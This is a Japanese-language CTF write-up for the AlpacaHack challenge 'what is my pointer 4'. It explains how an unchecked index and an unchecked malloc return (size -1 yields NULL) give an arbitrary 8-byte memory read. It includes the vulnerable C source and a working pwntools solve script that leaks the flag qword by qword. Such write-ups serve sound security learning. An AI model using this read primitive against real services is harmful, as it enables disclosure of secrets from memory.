# ■ Writeup::what-is-my-pointer-4
[what is my pointer 4 - AlpacaHack](https://alpacahack.com/daily/challenges/what-is-my-pointer-4)

# 1. Solution

- `item[index]` による範囲外アクセス
- `malloc` の戻り値未チェック
- `size = -1` → `size_t = SIZE_MAX` → `malloc` は `NULL` を返す.
- `item = NULL` より, `item[index]` がアドレス `0x0000000000000000` 起点の絶対アドレス参照になる.
- 1回の接続につき8byteのみ取得できる.

- `solve.py`
```Python
from pwn import *

_, HOST, PORT = 'nc localhost 1337'.split()

io = remote(HOST, PORT)
io.recvuntil(b'flag: ')
flag_addr = int(io.recvline(), 16)
io.close()
alignment = flag_addr % 8

def leak_qword(offset):
    offset -= alignment
    io = remote(HOST, PORT)
    io.recvuntil(b'flag: ')
    flag_addr = int(io.recvline(), 16)

    io.sendlineafter(b'size> ', b'-1')
    tgt_addr = flag_addr + offset
    assert tgt_addr % 8 == 0 # Align to 8-byte boundary
    index = tgt_addr // 8
    io.sendlineafter(b'index> ', str(index).encode())

    qword = int(io.recvline(), 16)
    io.close()
    return qword

data = b''
i = 0
while True:
    offset = 8 * i
    val = leak_qword(offset)
    data += val.to_bytes(8, 'little')
    if b'}' in data:
        break
    i += 1

print(f'[+] {data.split(b'\x00')[0]}')
```

- 実行結果例
```bash
$ python solve.py
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
[+] b'=Alpaca{REDACTED}'
```

# 2. Explanation
## 2.0. `chal.c`
- `chal.c`
```C
...
12    int main(void) {
13        printf("[DEBUG] flag: %p\n",getenv("FLAG"));
14    
15        puts("part1: alloc");
16        size_t size;
17        printf("size> ");
18        scanf("%ld%*c",&size);
19        unsigned long *item = malloc(size);
20    
21        puts("part2: read");
22        printf("index> ");
23        off_t index;
24        scanf("%ld%*c",&index);
25        printf("0x%lx\n",item[index]);
26    
27        puts("bye!!");
28    }
...
```

## 2.1. `index` の範囲未チェック
`item[index]` に対して, `index` の範囲チェックがされていないため, `item` を起点とした任意の8byteを読み出せる.

```
item[index] = item + 8 * index
```

## 2.2. `malloc` の戻り値未チェック

```C
19        unsigned long *item = malloc(size);
```

`malloc` が `NULL` を返すことが考慮されていない.

```C
16        size_t size;
17        printf("size> ");
18        scanf("%ld%*c",&size);
```

また, `size` に `-1` を渡すと `size = SIZE_MAX = 0xffff_ffff_ffff_ffff` となる.

glibcの `malloc` は要求サイズが `PTRDIFF_MAX` を超過すると `NULL` を返すため, この `size` を渡すと失敗する.

このとき `item == NULL` ( $=$ `0`) となるため,

```
item[index] = *(unsigned long *)(0 + 8 * index)
```

としてアドレス `0x0000000000000000` 起点の絶対アドレス参照となる.

したがって, `index = tgt_addr / 8` を指定して任意の8byteを読み出せる.

## 2.3. flag文字列の取得

$$\text{index} = \left\lfloor \frac{\text{flag\-addr}}{8} \right\rfloor$$

を指定すればflag文字列の先頭付近を読み出せる. 8byte境界に揃っていない場合, `flag_addr % 8` 分のズレが生じる.

`item = NULL = 0` であるため, 到達できるアドレスが8の倍数のアドレスであることに注意.

各接続ごとに8byte分取得できるため, 8byteずつずらせばflag文字列をすべて得ることができる.
